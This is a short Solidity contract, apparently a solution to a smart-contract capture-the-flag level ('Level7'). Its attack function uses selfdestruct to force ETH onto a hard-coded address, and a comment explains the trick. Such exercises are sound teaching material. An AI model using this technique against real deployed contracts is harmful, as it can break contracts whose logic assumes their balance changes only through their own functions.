// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/** 
 * The `selfdestruct` function can forcefully send ETH to any address.
 */
contract Level7 {
  function attack() public payable {
    selfdestruct(payable(0x3a388792a0A678DEb2c1747b8efE36b49f3EA601));
  }
}
